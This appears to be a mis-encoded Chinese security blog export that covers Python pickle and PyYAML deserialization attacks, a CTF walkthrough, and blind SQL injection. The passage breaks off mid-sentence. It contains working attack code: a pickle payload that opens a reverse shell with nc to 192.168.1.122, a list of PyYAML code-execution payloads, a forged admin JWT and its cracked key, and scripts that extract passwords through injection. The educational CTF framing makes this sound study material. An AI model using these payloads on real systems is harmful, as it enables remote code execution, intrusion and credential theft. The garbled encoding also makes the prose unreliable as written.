å°†å¯¹è±¡pickleåå­˜å‚¨æˆç£ç›˜æ–‡ä»¶ å°†å¯¹è±¡pickleååœ¨ç½‘ç»œä¸­ä¼ è¾“ æ¼æ´åˆ©ç”¨å½“åºåˆ—åŒ–åŠååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ç¢°åˆ°ä¸€æ— æ‰€çŸ¥çš„æ‰©å±•ç±»å‹ï¼ˆæ–°å¼ç±»ï¼‰æ—¶ï¼Œå¯ä»¥é€šè¿‡ç±»ä¸­çš„å®šä¹‰çš„__reduce__æ–¹æ³•æ¥å‘ŠçŸ¥å¦‚ä½•è¿›è¡Œåºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡è‡ªå®šä¹‰__reduce__æ–¹æ³•æ¥è®©è¿™ä¸ªç±»æ ¹æ®æˆ‘ä»¬åœ¨__reduce__ä¸­æŒ‡å®šçš„æ–¹å¼è¿›è¡Œåºåˆ—åŒ– pyaloadæ„é€  æ‰§è¡Œç³»ç»Ÿå‘½ä»¤payload dopickle.py 123456789101112131415#!/usr/bin/env python#coding: utf-8import pickleimport osclass genpoc(object): def __reduce__(self): s = &quot;&quot;&quot;whoami&quot;&quot;&quot; #è¦æ‰§è¡Œçš„å‘½ä»¤ return os.system, (s,) #os.system(&quot;echo test &gt;poc.txt&quot;)e = genpoc()poc = pickle.dumps(e)print(poc)pickle.loads(poc) è¾“å‡ºç»“æœå‘½ä»¤æ‰§è¡Œäº† æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªæ“ä½œç  123456c : è¯»å–æœ¬è¡Œçš„å†…å®¹ä½œä¸ºæ¨¡å—å( module ) , è¯»å–ä¸‹ä¸€è¡Œçš„å†…å®¹ä½œä¸ºå¯¹è±¡å( object ) . ç„¶åå°† module.object ä½œä¸ºå¯è°ƒç”¨å¯¹è±¡å‹å…¥åˆ°æ ˆä¸­( : å°†ä¸€ä¸ªæ ‡è®°å¯¹è±¡å‹å…¥åˆ°æ ˆä¸­ , ç”¨äºç¡®å®šå‘½ä»¤æ‰§è¡Œçš„ä½ç½® . è¯¥æ ‡è®°å¸¸å¸¸æ­é… t æŒ‡ä»¤ä¸€èµ·ä½¿ç”¨ , ä»¥ä¾¿äº§ç”Ÿä¸€ä¸ªå…ƒç»„S : åé¢è·Ÿå­—ç¬¦ä¸² , PVMä¼šè¯»å–å¼•å·ä¸­çš„å†…å®¹ , ç›´åˆ°é‡è§æ¢è¡Œç¬¦ , ç„¶åå°†è¯»å–åˆ°çš„å†…å®¹å‹å…¥åˆ°æ ˆä¸­t : ä»æ ˆä¸­ä¸æ–­å¼¹å‡ºæ•°æ® , å¼¹å°„é¡ºåºä¸å‹æ ˆæ—¶ç›¸åŒ , ç›´åˆ°å¼¹å‡ºå·¦æ‹¬å· . æ­¤æ—¶å¼¹å‡ºçš„å†…å®¹å½¢æˆäº†ä¸€ä¸ªå…ƒç»„ , ç„¶å , è¯¥å…ƒç»„ä¼šè¢«å‹å…¥æ ˆä¸­ .R : å°†ä¹‹å‰å‹å…¥æ ˆä¸­çš„å…ƒç»„å’Œå¯è°ƒç”¨å¯¹è±¡å…¨éƒ¨å¼¹å‡º , ç„¶åå°†è¯¥å…ƒç»„ä½œä¸ºå¯è°ƒç”¨å‚æ•°çš„å¯¹è±¡å¹¶æ‰§è¡Œè¯¥å¯¹è±¡ .æœ€åå°†ç»“æœå‹å…¥åˆ°æ ˆä¸­ .. : ç»“æŸæ•´ä¸ª Pickle ååºåˆ—åŒ–è¿‡ç¨‹ . åå¼¹shell 123456789101112131415#!/usr/bin/env python#coding: utf-8import pickleimport osclass genpoc(object): def __reduce__(self): cmd = &quot;&quot;&quot;rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 192.168.1.122 8888 &gt;/tmp/f&quot;&quot;&quot; #è¦æ‰§è¡Œçš„å‘½ä»¤ return (os.system, (cmd,)) #os.system(&quot;echo test &gt;poc.txt&quot;)e = genpoc()poc = pickle.dumps(e)print(poc)pickle.loads(poc) åå¼¹æˆåŠŸ ciscn 2019 Day1 Web2é€»è¾‘æ¼æ´ç»•è¿‡è¯·æ±‚é¦–é¡µï¼Œå‘ç°ä¸€ä¸ªç«™ç‚¹ï¼Œåœ¨æŸå¤„æç¤ºä¸€å®šè¦ä¹°åˆ°lv6 ä¸”å‘ç°é¡µé¢æœ‰æ³¨å†Œæœ‰ç™»é™†åŠŸèƒ½ å°è¯•æ³¨å†Œè´¦æˆ·greetdawn 123ï¼Œç™»é™†åè´­ä¹°lv6 ç›´æ¥å¯»æ‰¾lv6åœ¨å“ªé‡Œï¼Œç®€å•çš„ç¿»äº†å‡ é¡µï¼Œå‘ç°å¹¶æ— lv6ï¼Œä¸”urlæœ‰pageä¼ å‚ï¼Œæ—¢ç„¶è¿™ä¹ˆä¸å¥½æ‰¾ï¼Œé‚£å°±å†™ä¸ªè„šæœ¬è¯•ä¸€è¯• 12345678910111213#!/usr/bin/env python#coding: utf-8import requestsfor i in range(2000): url = &quot;http://192.168.1.191:8083/shop?page={}&quot;.format(i) r = requests.get(url) if 'lv6.png' in r.text: print(i) break è¿è¡Œæ‰¾åˆ°lv6å­˜åœ¨181é¡µ è¯·æ±‚ä¹‹åå‘ç°è¿™ç©æ„ç¡®å®æ˜¯ä¸€ä¸ªå¤©ä»·å‘€ï¼Œä¹°ä¸èµ·ä¹°ä¸èµ· è´­ä¹°æ—¶ï¼ŒæŠ“åŒ…å°è¯•ä¿®æ”¹ä»·æ ¼ï¼Œå°†ä»·æ ¼æˆ–æŠ˜æ‰£éƒ½ä¿®æ”¹ä¸º0ï¼Œå‘ç°éƒ½ä¼šæ˜¾ç¤ºæ“ä½œå¤±è´¥ è¿™è¾¹å°è¯•å¦ä¸€ç§æ–¹å¼ï¼Œæ”¹å˜ä»·æ ¼ï¼ŒæŠŠæŠ˜æ‰£ä¿®æ”¹åˆ°æœ€å°ï¼Œå‘ç°æˆåŠŸæœ‰è·³è½¬ï¼Œä½†æ˜¯è¿”å›ä¿¡æ¯æç¤ºéœ€è¦adminæƒé™ JWTä¼ªé€ è¿™è¾¹æˆ‘ä»¬å›åˆ°æœ€åˆçš„è¯·æ±‚å¤´å†…ï¼Œæˆ‘ä»¬å‘ç°åœ¨cookieå­—æ®µä¸­å­˜åœ¨JWTå­—æ®µï¼Œæ—¢ç„¶éœ€è¦adminæƒé™ï¼Œé‚£è¿™è¾¹æˆ‘ä»¬èƒ½æƒ³åˆ°çš„å°±æ˜¯ä½¿ç”¨jwtä¼ªé€  é¦–å…ˆæˆ‘ä»¬å…ˆæ¥ç®€å•äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯jwtï¼Ÿ JSON Web Token (JWT)æ˜¯ä¸€ä¸ªå¼€æ”¾æ ‡å‡†(RFC 7519)ï¼Œå®ƒå®šä¹‰äº†ä¸€ç§ç´§å‡‘çš„ã€è‡ªåŒ…å«çš„æ–¹å¼ï¼Œç”¨äºä½œä¸ºJSONå¯¹è±¡åœ¨å„æ–¹ä¹‹é—´å®‰å…¨åœ°ä¼ è¾“ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯å¯ä»¥è¢«éªŒè¯å’Œä¿¡ä»»ï¼Œå› ä¸ºå®ƒæ˜¯æ•°å­—ç­¾åçš„ã€‚ JSON Web Tokenç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œå®ƒä»¬ä¹‹é—´ç”¨åœ†ç‚¹(.)è¿æ¥ã€‚è¿™ä¸‰éƒ¨åˆ†åˆ†åˆ«æ˜¯ï¼šHeaderPayloadSignature JWTä¸Sessionçš„å·®å¼‚ ç›¸åŒç‚¹æ˜¯ï¼Œå®ƒä»¬éƒ½æ˜¯å­˜å‚¨ç”¨æˆ·ä¿¡æ¯ï¼›ç„¶è€Œï¼ŒSessionæ˜¯åœ¨æœåŠ¡å™¨ç«¯çš„ï¼Œè€ŒJWTæ˜¯åœ¨å®¢æˆ·ç«¯çš„ã€‚Sessionæ–¹å¼å­˜å‚¨ç”¨æˆ·ä¿¡æ¯çš„æœ€å¤§é—®é¢˜åœ¨äºè¦å ç”¨å¤§é‡æœåŠ¡å™¨å†…å­˜ï¼Œå¢åŠ æœåŠ¡å™¨çš„å¼€é”€ã€‚è€ŒJWTæ–¹å¼å°†ç”¨æˆ·çŠ¶æ€åˆ†æ•£åˆ°äº†å®¢æˆ·ç«¯ä¸­ï¼Œå¯ä»¥æ˜æ˜¾å‡è½»æœåŠ¡ç«¯çš„å†…å­˜å‹åŠ›ã€‚Sessionçš„çŠ¶æ€æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œå®¢æˆ·ç«¯åªæœ‰session idï¼›è€ŒTokençš„çŠ¶æ€æ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ã€‚ ä½¿ç”¨å·¥å…·https://jwt.io/è¿›è¡ŒjwtåŠ è§£å¯† æˆ‘ä»¬å‘ç°ç¡®å®è¿™æ®µcookieä¸­å­˜æ”¾äº†å½“å‰ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·ä¿¡æ¯ é‚£ä¹ˆä¸€æ¬¡æ¥ä¼ªé€ adminçš„jwtçš„å€¼ é¦–å…ˆæˆ‘ä»¬éœ€è¦ä½¿ç”¨c-jwt-crackeræ¥è·‘å¯†é’¥ è·‘å‡ºæ¥ç§˜é’¥ä¸º1Kun å¸¦å…¥è·å–adminå€¼eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo ä¿®æ”¹jwtå€¼ï¼Œæ“ä½œæˆåŠŸï¼Œè·å–åˆ°ä¸€ä¸ªæºç å‹ç¼©åŒ…è·¯å¾„/static/asd1f654e683wq/www.zip pickleååºåˆ—åŒ–è¯·æ±‚å‹ç¼©åŒ…ï¼Œè·å–åˆ°æºç å†…å®¹ï¼Œåœ¨æºç Admin.pyä¸­å­˜åœ¨å¦‚ä¸‹pickleååºåˆ—åŒ–ä»£ç  æŠ“å–åˆ°becomeå˜é‡é¡µé¢ï¼Œç¼–å†™payloadçš„è„šæœ¬ 123456789101112131415#!/usr/bin/env python#coding: utf-8import pickleimport commandsimport urllibclass genpoc(object): def __reduce__(self): s = &quot;&quot;&quot;cat /flag.txt&quot;&quot;&quot; #è¦æ‰§è¡Œçš„å‘½ä»¤ return (commands.getoutput, (s,)) #os.system(&quot;echo test &gt;poc.txt&quot;)e = genpoc()poc = pickle.dumps(e)print(urllib.quote(poc)) PyYamlæ¨¡å—è¯¦è§£PyYamlåŸºç¡€YAMLæ˜¯ä¸€ç§ç›´è§‚çš„èƒ½å¤Ÿè¢«ç”µè„‘è¯†åˆ«çš„çš„æ•°æ®åºåˆ—åŒ–æ ¼å¼ï¼Œå®¹æ˜“è¢«äººç±»é˜…è¯»ï¼Œå¹¶ä¸”å®¹æ˜“å’Œè„šæœ¬è¯­è¨€äº¤äº’ï¼ŒYAMLç±»ä¼¼äºXMLï¼Œä½†æ˜¯è¯­æ³•æ¯”XMLç®€å•å¾—å¤šï¼Œå¯¹äºè½¬åŒ–æˆæ•°ç»„æˆ–å¯ä»¥hashçš„æ•°æ®æ—¶æ˜¯å¾ˆç®€å•æœ‰æ•ˆçš„ã€‚ å¤§å°å†™æ•æ„Ÿ ä½¿ç”¨ç¼©è¿›è¡¨ç¤ºå±‚çº§å…³ç³» ç¼©è¿›æ—¶ä¸å…è®¸ä½¿ç”¨Tabï¼Œåªå…è®¸ä½¿ç”¨ç©ºæ ¼ ç¼©è¿›çš„ç©ºæ ¼æ•°ç›®ä¸é‡è¦ï¼Œåªè¦ç›¸åŒå±‚çº§çš„å…ƒç´ å·¦å¯¹é½å³å¯ â€˜#â€™è¡¨ç¤ºæ³¨é‡Šï¼Œä»å®ƒå¼€å§‹åˆ°è¡Œå°¾éƒ½è¢«å¿½ç•¥ 12yaml.load() : Python PyYAML åº“ç‰ˆæœ¬ &lt; 5.1b1yaml.unsafe_load() : Python PyYAML åº“ç‰ˆæœ¬ &gt;= 5.1b1 PyYamlä¸­çš„æ ¼å¼ yamlè½¬å­—å…¸ 123456789101112#!/usr/local/env pythonimport yamldata = &quot;&quot;&quot;name: greetdawnage: 19job: Player&quot;&quot;&quot;a = yaml.load(data)print(a) yamlè½¬åˆ—è¡¨ 123456789101112#!/usr/local/env pythonimport yamldata = &quot;&quot;&quot;- greetdawn- 19- Player&quot;&quot;&quot;a = yaml.load(data)print(a) å¤åˆç»“æ„ç±»å‹ 123456789101112131415#!/usr/local/env pythonimport yamldata = &quot;&quot;&quot;- name: greetdawn age: 18 job: teacher- name: zhangsan age: 40 job: player&quot;&quot;&quot;a = yaml.load(data)print(a) çº¯é‡å’Œæ ‡é‡ å½“å­—ç¬¦ä¸²ä¸­ä¸åŒ…å«ç©ºæ ¼æˆ–è€…ç‰¹æ®Šå­—ç¬¦æ—¶ , å¯ä»¥ä¸åŠ å¼•å· . å¦‚æœå­—ç¬¦ä¸²ä¸­åŒ…å«ç©ºæ ¼æˆ–ç‰¹æ®Šå­—ç¬¦ , å°±è¦ä½¿ç”¨å¼•å· . ä½†éœ€è¦æ³¨æ„ , å•å¼•å·ä¼šå¯¹ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ , åŒå¼•å·ä¸ä¼šå¯¹ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ . å¼ºåˆ¶ç±»å‹è½¬æ¢ å•ä¸ªæ„Ÿå¹å·( ! )é€šå¸¸ç”¨äºå¼ºåˆ¶è½¬æ¢ä¸ºè‡ªå®šä¹‰ç±»å‹ , è€Œä¸¤ä¸ªæ„Ÿå¹å·( !! )é€šå¸¸ç”¨äºå¼ºåˆ¶è½¬æ¢ä¸ºå†…ç½®ç±»å‹ . 1234567891011#!/usr/local/env pythonimport yamldata = &quot;&quot;&quot; string: !!str 3.1415926 int: !!int &quot;123456&quot;&quot;&quot;&quot;a = yaml.load(data)print(a) PyYamlååºåˆ—åŒ–æ¼æ´åˆ†æ pyyamlçš„å¯¹è±¡è½¬åŒ–è§„åˆ™ %PYTHON-HOME%/Lib/site-packages/yaml/constructor.py åœ¨æºç ä¸­æˆ‘ä»¬é‡ç‚¹å…³æ³¨è¿™ä¸ªä¸‰ä¸ªç‰¹æ®Šçš„è½¬æ¢è§„åˆ™ construct_python_object() construct_python_object_apply() construct_python_object_new() æˆ‘ä»¬å¯ä»¥æ¸…æ™°çš„å‘ç°ï¼Œè¿™ä¸‰ä¸ªå‡½æ•°éƒ½è°ƒç”¨äº†å‡½æ•°self.make_python_instance()è¿™ä¸ªå‡½æ•°ï¼Œè®©æˆ‘ä»¬æ¥ä¸€èµ·è·Ÿè¸ªä¸€ä¸‹è¯¥å‡½æ•°ï¼š è¯¥å‡½æ•°çš„é€»è¾‘æ˜¯è°ƒç”¨äº†find_python_name()å‡½æ•°ï¼Œå¹¶ä¸”æ‰§è¡Œçš„ç»“æœèµ‹å€¼ç»™clså˜é‡ï¼Œä¹‹ååˆå°†å˜é‡clsçš„å€¼ä½œä¸ºå‡½æ•°åï¼Œè°ƒç”¨è¯¥å‡½æ•°å¹¶å°†æ‰§è¡Œç»“æœè¿”å›ï¼› è¿™ç§å°†è¿”å›å€¼ä½œä¸ºå‡½æ•°åå¹¶è°ƒç”¨è¯¥å‡½æ•°çš„ç¼–ç¨‹æ–¹å¼æä¸ºå±é™©ï¼Œè¿™é‡Œå¦‚æœç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶è¢«è°ƒç”¨å‡½æ•°çš„å‡½æ•°ååŠå‚æ•°çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°ä»£ç çš„ä»»æ„æ‰§è¡Œï¼› è¿™è¾¹æˆ‘ä»¬ç»§ç»­è·Ÿè¿›find_python_name()å‡½æ•° æ ¹æ®ä»£ç æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå‡è®¾ä¼ å…¥å˜é‡nameçš„å‚æ•°ä¸ºos.system()ï¼Œé¦–å…ˆä¼šå°è¯•å¯¼å…¥osæ¨¡å—ï¼Œç„¶åå†åˆ¤æ–­osæ¨¡å—ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å¯¹è±¡(system),å¦‚æœè¯¥å¯¹è±¡å­˜åœ¨å°±å°†è¯¥å¯¹è±¡è¿”å›ã€‚ å½“å‡½æ•°è¿”å›åï¼Œpythonä¼šåŠ¨æ€è°ƒç”¨è¯¥å‡½æ•°ï¼Œé‚£ä¹ˆç”¨æˆ·è¾“å…¥çš„æ¶æ„æŒ‡ä»¤ä¼šè¢«æ‹¼æ¥åˆ°åŠ¨æ€è°ƒç”¨çš„å‡½æ•°ä¸­ ç®€å•çš„å°ä¾‹å­ 1234567891011#!/usr/local/env pythonimport osclass Poc1(): def shell(self): os.system('whoami') obj = Poc1()cls = getattr(obj, &quot;shell&quot;)cls() PyYamlååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ æœ€åŸºæœ¬æ¡ä»¶ï¼Œé¦–å…ˆè¦è®© PyYAML èƒ½å¤Ÿè§£æåºåˆ—åŒ–å­—ç¬¦ä¸² , æ‰€ä»¥è¦ä½¿ç”¨ !!python è¿™ä¸ªæ ‡ç­¾( !!python/object , !!python/object/apply , !!python/object/newéƒ½å¯ä»¥ ) ååºåˆ—åŒ–çš„è¿‡ç¨‹å®é™…ä¸Šæ˜¯ç±»å®ä¾‹åŒ–çš„è¿‡ç¨‹ . åªæœ‰è¢«å®ä¾‹åŒ–çš„ç±»ä¸­åŒ…å«å‡½æ•° , ä¸”å‡½æ•°ä¸­åŒ…å«æˆ‘ä»¬çš„æ¶æ„ä»£ç æ—¶ , æˆ‘ä»¬çš„æ¶æ„ä»£ç æ‰æœ‰å¯èƒ½è¢«è°ƒç”¨æ‰§è¡Œ æ™®é€šæ•°æ®ç±»å‹( å­—ç¬¦ä¸² , åˆ—è¡¨ , å…ƒç»„ , å­—å…¸ )çš„ååºåˆ—åŒ–è¿‡ç¨‹æ˜¯çº¯é‡åˆå§‹åŒ– , èµ‹å€¼çš„è¿‡ç¨‹ï¼Œä¸ä¼šæ¶‰åŠåˆ°è´Ÿè´£é€»è¾‘å¤„ç†çš„ä»£ç å—ï¼Œä¹Ÿå°±ä¸ä¼šæœ‰ä»£ç è¢«è°ƒç”¨æ‰§è¡Œ . å› æ­¤ , æˆ‘ä»¬éœ€è¦å¯¼å…¥ä¸€ä¸ªç±» , è¿™ä¸ªç±»å­˜åœ¨ä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„å‡½æ•° , ä¸”è¯¥å‡½æ•°ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ . æˆ‘ä»¬å°†è¿™ä¸ªç±»åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸² , å†æŠŠè¿™ä¸ªå­—ç¬¦ä¸²æäº¤ç»™ PyYAML è§£ææ‰§è¡Œ . å¸¸ç”¨payloadæ±‡æ€»123456!!python/object/apply:subprocess.check_output [[calc.exe]]!!python/object/apply:subprocess.check_output [&quot;calc.exe&quot;]!!python/object/apply:subprocess.check_output [[&quot;calc.exe&quot;]]!!python/object/apply:os.system [&quot;calc.exe&quot;]!!python/object/new:subprocess.check_output [[&quot;calc.exe&quot;]]!!python/object/new:os.system [&quot;calc.exe&quot;]","link":"/2021/02/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/python-code-audit/python-unserialize/"},{"title":"SQLæ³¨å…¥ä¸­çš„ç‚¹ç‚¹æ»´æ»´","text":"ç›²æ³¨ä¸­çš„å¤šç§æŠ€å·§XORç›²æ³¨(å¼‚æˆ–ç›²æ³¨)åŸºæœ¬åŸç†å¼‚æˆ–æ˜¯ä¸€ç§é€»è¾‘è¿ç®—ã€‚ è¿ç®—æ³•åˆ™ï¼š ä¸¤ä¸ªæ¡ä»¶ç›¸åŒ(åŒçœŸæˆ–åŒå‡)å³ä¸ºå‡(0)ï¼Œä¸¤ä¸ªæ¡ä»¶ä¸åŒå³ä¸ºçœŸï¼ˆ1ï¼‰ï¼› nullä¸ä»»ä½•æ¡ä»¶åšå¼‚æˆ–è¿ç®—éƒ½ä¸ºnullï¼Œå¦‚æœä»æ•°å­¦çš„è§’åº¦ç†è§£å°±æ˜¯ï¼Œç©ºé›†ä¸ä»»ä½•é›†åˆçš„äº¤é›†éƒ½ä¸ºç©ºã€‚ mysqlé‡Œå¼‚æˆ–è¿ç®—ç¬¦ä¸º^ æˆ–è€… xorï¼› ä¸¤ä¸ªåŒä¸ºçœŸçš„æ¡ä»¶åšå¼‚æˆ–ï¼Œç»“æœä¸ºå‡ ä¸¤ä¸ªåŒä¸ºå‡çš„æ¡ä»¶åšå¼‚æˆ–ï¼Œç»“æœä¸ºå‡ ä¸€ä¸ªæ¡ä»¶ä¸ºçœŸï¼Œä¸€ä¸ªæ¡ä»¶ä¸ºå‡ï¼Œç»“æœä¸ºå‡ nullä¸ä»»ä½•æ¡ä»¶ï¼ˆçœŸã€å‡ã€nullï¼‰åšå¼‚æˆ–ï¼Œç»“æœéƒ½ä¸ºnull é¢˜ç›®ç¯å¢ƒhttp://123.206.31.85:49167/index.php xoræ³¨å…¥çš„åŸºæœ¬æ€è·¯æ˜¯ï¼šåœ¨MySQLä¸­å¼‚æˆ–çš„ç¬¦å·æ˜¯^ï¼Œè¯¥ç¬¦å·å¯ä»¥èµ·åˆ°ä¸€ç§é€»è¾‘åˆ¤æ–­çš„ä½œç”¨ï¼Œ0^1=1ã€0^0=0è¿™æ ·å¯ä»¥å½¢æˆä¸€ç§å¸ƒå°”ç›²æ³¨çš„æ•ˆæœ,å¯¹å…¶ä¸­çš„å­—ç¬¦è¿›è¡Œé€ä¸€çŒœè§£å³å¯ã€‚ ä¾‹é¢˜è§£æé¦–å…ˆè¯·æ±‚é¢˜ç›®å‘ç°æ˜¯ä¸€ä¸ªç™»é™†æ¡† ä¸€èˆ¬å¯¹äºç™»é™†æ¡†çš„æ³¨å…¥æ€è·¯ä¹Ÿå°±é‚£å‡ ç§ï¼Œè¿™è¾¹è€ƒå¯Ÿçš„æ³¨å…¥å‡ºadminè´¦æˆ·çš„å¯†ç ã€‚è¿™é‡Œå°è¯•ç®€å•çš„fuzzä¸€ä¸‹ï¼Œå‘ç°å…¶ä¸­è¿‡æ»¤äº†oré€—å·ï¼Œç©ºæ ¼æ³¨é‡Šç¬¦ç­‰å·ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå¹¶ä¸”å…³é”®åº“information_schemaä¹Ÿè¢«è¿‡æ»¤äº†ã€‚ä½†æ˜¯å¯ä»¥å°è¯•ä¸€ä¸‹payload:admin'^(ascii(substr((password)from({})))&gt;{})#ï¼Œæ—¢ç„¶æ˜¯ç›²æ³¨ï¼Œé‚£å°±ç›´æ¥ä¸Šè„šæœ¬å¥½äº†ï¼š 1234567891011121314151617181920212223242526#!/usr/bin/env python3#-*- coding:utf-8 -*-import requestsimport sysurl = 'http://123.206.31.85:49167/index.php'proxies = { 'http://': '127.0.0.1:8080', }order = 1while True: for i in range(23, 129): data = { &quot;username&quot;:&quot;admin'^(ascii(substr((password)from({})))&gt;{})#&quot;.format(order, i), &quot;password&quot;:&quot;asd&quot; } r = requests.post(url = url, data = data, proxies=proxies, timeout = 3) #print(r.text) if 'password error!' in r.text: sys.stdout.write(chr(i)) sys.stdout.flush() order += 1 break è·‘å‡ºadminè´¦æˆ·çš„å¯†ç md5å€¼:51b7a76d51e70b419f60d3473fb6f900 å°è¯•ç™»å½•æ— æœï¼Œç›´æ¥ä½¿ç”¨MD5ç ´è§£ï¼Œå¾—åˆ°æ˜æ–‡å­—ç¬¦skctf123456 ç›´æ¥å°è¯•ç™»å½•å¾—åˆ°flag:SKCTF{b1iNd_SQL_iNJEcti0n!} regexp/relikeç›²æ³¨æ³¨å…¥åŸç†REGEXPæ³¨å…¥ï¼Œå³regexpæ­£åˆ™è¡¨è¾¾å¼æ³¨å…¥ã€‚REGEXPæ³¨å…¥ï¼Œåˆå«ç›²æ³¨å€¼æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»ã€‚åº”ç”¨åœºæ™¯å°±æ˜¯ç›²æ³¨ï¼ŒåŸç†æ˜¯ç›´æ¥æŸ¥è¯¢è‡ªå·±éœ€è¦çš„æ•°æ®ï¼Œç„¶åé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ã€‚ regexpåŸºæœ¬ç”¨æ³• è¯­æ³• 1select (select è¯­å¥) regexp 'æ­£åˆ™' æ ‡å‡†æŸ¥è¯¢è¯­å¥ï¼Œç›´æ¥è¿”å›æŸ¥è¯¢ç»“æœ 1select username from users where id=1; æ­£åˆ™åŒ¹é…ï¼Œè‹¥åŒ¹é…ï¼Œåˆ™è¿”å›1ï¼Œä¸åŒ¹é…è¿”å›0 123456789101112131415mysql&gt; select (select username from users where id=1) regexp '^d';+-----------------------------------------------------+| (select username from users where id=1) regexp '^d' |+-----------------------------------------------------+| 1 |+-----------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select username from users where id=1) regexp '^e';+-----------------------------------------------------+| (select username from users where id=1) regexp '^e' |+-----------------------------------------------------+| 0 |+-----------------------------------------------------+1 row in set (0.00 sec) æ³¨ï¼š^è¡¨ç¤ºpattern(æ¨¡å¼ä¸²)çš„å¼€å¤´ã€‚å³è‹¥åŒ¹é…åˆ°usernameå­—æ®µä¸‹id=1çš„æ•°æ®å¼€å¤´ä¸ºaï¼Œåˆ™è¿”å›1ï¼›å¦åˆ™è¿”å›0 ä½¿ç”¨regexpè¡¨ç¤ºwhereæ¡ä»¶ä¸­çš„=å· 1234567891011mysql&gt; select * from users where password regexp '^ad';+----+----------+----------+| id | username | password |+----+----------+----------+| 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 14 | admin4 | admin4 |+----+----------+----------+5 rows in set (0.00 sec) ä½¿ç”¨åœºæ™¯=ã€inã€likeè¢«è¿‡æ»¤çš„æƒ…å†µä¸‹ä½¿ç”¨ è‹¥^è¢«è¿‡æ»¤ï¼Œå¯ä½¿ç”¨$æ¥ä»åå¾€å‰è¿›è¡ŒåŒ¹é… å¸¸ç”¨regexpæ­£åˆ™è¯­å¥ï¼š 123regexp '^[a-z]' #åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­regexp '^r' #åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºrregexp '^r[a-z]' #åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬äºŒä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­ regexpåœ¨è”åˆæŸ¥è¯¢ä¸­çš„ä½¿ç”¨ 1234567891011121314151617mysql&gt; select username,password from users where id=1 union select 1,database() regexp '^s';+----------+----------+| username | password |+----------+----------+| Dumb | Dumb || 1 | 1 |+----------+----------+2 rows in set (0.00 sec)mysql&gt; select username,password from users where id=1 union select 1,database() regexp '^x';+----------+----------+| username | password |+----------+----------+| Dumb | Dumb || 1 | 0 |+----------+----------+2 rows in set (0.00 sec) sqlilabä¸­ç®€å•åœºæ™¯çš„è¿ç”¨sqli-labsé¶åœºLess-8æ˜¯ä¸€ä¸ªç®€å•çš„å¸ƒå°”ç›²æ³¨å®éªŒç¯å¢ƒï¼Œè¿™ä¸ªå®éªŒç¯å¢ƒæ˜¯æ²¡æœ‰ç»è¿‡ä»»ä½•è¿‡æ»¤çš„ã€‚ åˆ¤æ–­åº“çš„é•¿åº¦ 'or (length(database())=8)--+ #è¿”å›æ­£å¸¸ åˆ¤æ–­åº“å ' or database() regexp '^s'--+ #è¿”å›æ­£å¸¸ ' or database() regexp 'y$'--+ #è¿”å›æ­£å¸¸ æ—¢ç„¶è¿™ä¹ˆç®€å•ï¼Œå°±ç›´æ¥ä¸Šä¸ªè„šæœ¬ä¸€æŠŠæ¢­ 1234567891011121314151617181920212223242526272829#!/usr/local/env python3# -*- coding:utf-8 -*-import requestsimport stringimport sysstrs = string.printablepayloads = { &quot;dbname&quot;: &quot;'or database() regexp '^{}'--+&quot;, &quot;table_name&quot;: &quot;'or (select table_name from information_schema.tables where table_schema=database() limit 1,1) regexp '^{}'--+&quot;, &quot;column_name&quot;: &quot;'or (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1) regexp '^{}'--+&quot;, &quot;data&quot;: &quot;'or (select username from users limit 1,1) regexp '^{}'--+&quot;,}url = &quot;http://192.168.1.191:32769/Less-8/?id=&quot;temp = ''while True: for str in strs: payload = url + payloads['data'].format(temp + str) r = requests.get(url = payload) if 'You are in' in r.text: sys.stdout.write(str) sys.stdout.flush() temp += str break ä¾‹é¢˜å®æˆ˜ç®€å•è¯·æ±‚å‘ç°å­˜åœ¨robots.txtï¼Œè¯·æ±‚åæç¤ºå­˜åœ¨hint.txt æç¤ºä¸­å‘Šè¯‰äº†æˆ‘ä»¬ä¸€ä¸ªè¯­å¥select * from users where username='$_POST[&quot;username&quot;]' and password='$_POST[&quot;password&quot;]'; å¹¶ä¸”æˆåŠŸæ³¨å…¥å‡ºå¯†ç æ‰å¯ä»¥å¾—åˆ°flag é¦–å…ˆfuzzä¸€ä¸‹ï¼Œçœ‹çœ‹è¿‡æ»¤äº†å“ªäº›ä¸œè¥¿ æˆ‘ä»¬å‘ç°å•å¼•å· 